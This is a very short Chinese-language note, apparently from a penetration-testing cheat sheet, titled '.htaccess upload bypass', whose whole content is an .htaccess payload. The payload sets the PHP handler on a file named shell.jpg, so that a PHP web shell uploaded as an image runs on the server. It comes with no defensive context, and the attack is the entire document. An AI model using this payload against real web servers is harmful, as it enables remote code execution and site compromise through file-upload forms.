# `.htaccess`上传绕过

## 测试

```php
<FilesMatch "shell.jpg">
  SetHandler application/x-httpd-php
</FilesMatch>
```